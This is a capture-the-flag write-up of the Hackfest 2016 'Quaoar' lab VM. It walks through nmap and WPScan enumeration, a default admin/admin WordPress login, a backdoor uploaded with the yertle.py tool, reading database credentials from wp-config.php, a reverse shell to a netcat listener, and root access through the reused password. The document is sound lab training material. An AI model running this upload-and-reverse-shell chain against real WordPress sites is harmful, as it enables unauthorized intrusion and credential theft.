---
layout: post
title: "Hackfest 2016: Quaoar"
date: 2018-09-21 10:37:53 -0400
comments: true
categories: [penetration testing, writeups]
keywords: quaoar, hackfest, hackfest quaoar, vulnhub, wpforce, yertle
description: Quaoar writeup
---

Today's target was created for the Hackfest 2016 CTF. The goal is to become root and get a flag on the machine.

<!-- more -->

Nmap shows SSH, Samba, a web server and mail services running on the target:

``` 
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d0:0a:61:d5:d0:3a:38:c2:67:c3:c3:42:8f:ae:ab:e5 (DSA)
|   2048 bc:e0:3b:ef:97:99:9a:8b:9e:96:cf:02:cd:f1:5e:dc (RSA)
|_  256 8c:73:46:83:98:8f:0d:f7:f5:c8:e4:58:68:0f:80:75 (ECDSA)
53/tcp  open  domain      ISC BIND 9.8.1-P1
| dns-nsid: 
|_  bind.version: 9.8.1-P1
80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_Hackers
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: RESP-CODES SASL STLS CAPA UIDL PIPELINING TOP
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2018-09-21T14:42:41+00:00; 0s from scanner time.
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: post-login have more capabilities Pre-login LOGINDISABLEDA0001 LITERAL+ listed ENABLE OK LOGIN-REFERRALS ID STARTTLS IMAP4rev1 IDLE SASL-IR
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2018-09-21T14:42:41+00:00; 0s from scanner time.
445/tcp open  netbios-ssn Samba smbd 3.6.3 (workgroup: WORKGROUP)
993/tcp open  ssl/imap    Dovecot imapd
|_imap-capabilities: post-login more capabilities Pre-login have LITERAL+ listed ENABLE OK LOGIN-REFERRALS ID AUTH=PLAINA0001 IMAP4rev1 IDLE SASL-IR
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2018-09-21T14:42:41+00:00; +1s from scanner time.
995/tcp open  ssl/pop3    Dovecot pop3d
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2018-09-21T14:42:40+00:00; +1s from scanner time.
```

On the web server there are some pictures with planets and the message "Hack The Planet". But there are entries in robots.txt:

``` 
Disallow: Hackers
Allow: /wordpress/
   ____                              
#  /___ \_   _  __ _  ___   __ _ _ __ 
# //  / / | | |/ _` |/ _ \ / _` | '__|
#/ \_/ /| |_| | (_| | (_) | (_| | |   
#\___,_\ \__,_|\__,_|\___/ \__,_|_|  
```

No directory called hackers but there is a Wordpress blog :p

{% img center /images/pentest/quaoar/quaoar_blog.png 'wordpress' 'wordpress blog' %}

Naturally, I ran Wpscan, and it found 2 usernames:

``` 
[+] Enumerating usernames ...
[+] We identified the following 2 users:
    +----+--------+--------+
    | ID | Login  | Name   |
    +----+--------+--------+
    | 1  | admin  | admin  |
    | 2  | wpuser | wpuser |
    +----+--------+--------+
```

A prelimiary check for default credentials actually revealed the password for the admin user is..you will never guess it..admin! For receiving a shell, I wanted to try a new tool: [WPForce](https://github.com/n00py/WPForce)!

> WPForce is a suite of Wordpress Attack tools. Currently this contains 2 scripts - WPForce, which 
> brute forces logins via the API, and Yertle, which uploads shells once admin credentials have been 
> found. Yertle also contains a number of post exploitation modules.

I used the <code>yertle.py</code> script to upload a backdoor:

``` 
python yertle.py -u "admin" -p "admin" -t "http://192.168.217.145/wordpress" -i
     _..---.--.    __   __        _   _
   .'\ __|/O.__)   \ \ / /__ _ __| |_| | ___
  /__.' _/ .-'_\    \ V / _ \ '__| __| |/ _ \.
 (____.'.-_\____)    | |  __/ |  | |_| |  __/
  (_/ _)__(_ \_)\_   |_|\___|_|   \__|_|\___|
   (_..)--(.._)'--'         ~n00py~
      Post-exploitation Module for Wordpress
                     v.1.1.0
    
Backdoor uploaded!
Upload Directory: cpucqjc
os-shell> whoami
Sent command: whoami
www-data
os-shell> pwd
Sent command: pwd
/var/www/wordpress/wp-content/plugins/cpucqjc
```

Time to snoop around! I was able to read <code>/var/www/wordpress/wp-config.php</code> and inside found credentials for the SQL database:

``` 
/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'rootpassword!');
```

I also found a flag inside *wpadmin*'s home directory:

``` 
os-shell> cat /home/wpadmin/flag.txt
Sent command: cat /home/wpadmin/flag.txt
2bafe61f03117ac66a73c3c514de796e
```

I found the shell I had pretty restrictive so I used Yertle to get a reverse shell that I could upgrade:

``` 
os-shell> shell
IP Address: 192.168.217.132
Port: 8888
Sending reverse shell to 192.168.217.132 port 8888
```

And on my listener side:

``` 
nc -lnvp 8888
listening on [any] 8888 ...
connect to [192.168.217.132] from (UNKNOWN) [192.168.217.145] 50713
bash: no job control in this shell
www-data@Quaoar:/var/www/wordpress/wp-content/plugins/cpucqjc$ 
```

I used Python to spawn a TTY and then I tried the root credentials for a pleasant surprise. They are the actual credentials of the root user!

``` 
root@Quaoar:~# cat /root/flag.txt
8e3f9ec016e3598c5eec11fd3d73f6fb
```

And that was it for this challenge!

``` 
 __________________________________
/ Be cheerful while you are alive. \
|                                  |
\ -- Phathotep, 24th Century B.C.  /
 ----------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

